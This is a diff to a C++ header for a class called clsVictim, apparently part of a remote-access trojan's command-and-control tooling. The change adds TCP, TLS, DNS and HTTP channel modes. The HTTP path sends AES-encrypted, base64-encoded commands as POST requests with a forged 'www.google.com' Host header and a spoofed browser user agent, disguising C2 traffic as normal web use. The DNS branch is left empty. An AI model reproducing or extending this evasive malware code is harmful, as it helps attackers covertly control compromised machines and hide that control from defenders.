@@ -14,34 +14,55 @@
 #include "clsTools.hpp"
 #include "clsEZData.hpp"
 #include "clsCrypto.hpp"
+#include "clsHttpPkt.hpp"
 
 class clsVictim
 {
-private:
+public:
+    enum enMethod
+    {
+        TCP,
+        TLS,
+        DNS,
+        HTTP,
+    };
     
 public:
-    int m_nSkt;
-    clsCrypto m_crypto;
+    enMethod m_method;
+
+    int m_nSkt = -1;
     SSL* m_ssl;
+
+    clsCrypto m_crypto;
+    clsHttpPkt m_httpPkt;
 
 public:
     clsVictim()
     {
 
     }
-    clsVictim(int nSkt)
+    clsVictim(enMethod method, int nSkt)
     {
+        m_method = method;
         m_nSkt = nSkt;
     }
-    clsVictim(int nSkt, clsCrypto crypto)
+    clsVictim(enMethod method, int nSkt, clsCrypto crypto)
     {
+        m_method = method;
         m_nSkt = nSkt;
         m_crypto = crypto;
     }
-    clsVictim(int nSkt, SSL* ssl)
+    clsVictim(enMethod method, int nSkt, SSL* ssl)
     {
+        m_method = method;
         m_nSkt = nSkt;
         m_ssl = ssl;
+    }
+    clsVictim(enMethod method, int nSkt, clsHttpPkt http)
+    {
+        m_method = method;
+        m_nSkt = nSkt;
+        m_httpPkt = http;
     }
 
     ~clsVictim() = default;
@@ -84,7 +105,25 @@ public:
     {
         clsEDP edp(nCommand, nParam, vuBuffer);
         std::vector<unsigned char> vuData = edp.fnabGetBytes();
-        return fnSendRAW(vuData);
+
+        if (m_method == enMethod::TCP)
+        {
+            return fnSendRAW(vuData);
+        }
+        else if (m_method == enMethod::HTTP)
+        {
+            std::string szBody = clsEZData::fnb64EncodeUtf8(vuData);
+            BUFFER abHttpPkt = m_httpPkt.fnGetPacket(
+                clsHttpPkt::enMethod::POST,
+                "/",
+                "www.google.com",
+                "text/plain",
+                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+                szBody
+            );
+
+            return fnSendRAW(abHttpPkt);
+        }
     }
     ssize_t fnSend(uint8_t nCommand, uint8_t nParam, const std::string& szMsg)
     {
@@ -100,9 +139,39 @@ public:
     }
     ssize_t fnSendCommand(const std::string& szMsg)
     {
-        std::vector<unsigned char> vuCipher = m_crypto.fnvuAESEncrypt(szMsg);
+        if (m_method == enMethod::TCP)
+        {
+            std::vector<unsigned char> vuCipher = m_crypto.fnvuAESEncrypt(szMsg);
+            return fnSend(2, 0, vuCipher);
+        }
+        else if (m_method == enMethod::TLS)
+        {
+            return fnSslSend(szMsg);
+        }
+        else if (m_method == enMethod::DNS)
+        {
+            
+        }
+        else if (m_method == enMethod::HTTP)
+        {
+            BUFFER abData = m_crypto.fnvuAESEncrypt(szMsg);
+            clsEDP edp(2, 0, abData);
+            BUFFER abBuffer = edp.fnabGetBytes();
+            std::string szData = clsEZData::fnb64Encode(abBuffer);
 
-        return fnSend(2, 0, vuCipher);
+            BUFFER abHttpPkt = m_httpPkt.fnGetPacket(
+                clsHttpPkt::enMethod::POST,
+                "/",
+                "www.google.com",
+                "text/plain",
+                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+                szData
+            );
+
+            return fnSendRAW(abHttpPkt);
+        }
+
+        return -1;
     }
 
     ssize_t fnSendCmdParam(uint8_t nCommand, uint8_t nParam, uint nLength = 10)
@@ -113,13 +182,26 @@ public:
         clsEDP edp(nCommand, nParam, vuBuffer);
         std::vector<unsigned char> vuData = edp.fnabGetBytes();
 
-        return fnSendRAW(vuData);
+        if (m_method == enMethod::TCP)
+        {
+            return fnSendRAW(vuData);
+        }
+        else if (m_method == enMethod::HTTP)
+        {
+            std::string szBody(vuData.begin(), vuData.end());
+            return fnSendCommand(szBody);
+        }
+
+        return -1;
     }
 
-    ssize_t fnSslSend(std::string& szMsg)
+    ssize_t fnSslSend(const std::string& szMsg)
     {
         BUFFER abBuffer(szMsg.begin(), szMsg.end());
-        return fnSslSend(abBuffer);
+        clsEDP edp(0, 0, abBuffer);
+        BUFFER abMsg = edp.fnabGetBytes();
+
+        return fnSslSend(abMsg);
     }
     ssize_t fnSslSend(BUFFER& abBuffer)
     {
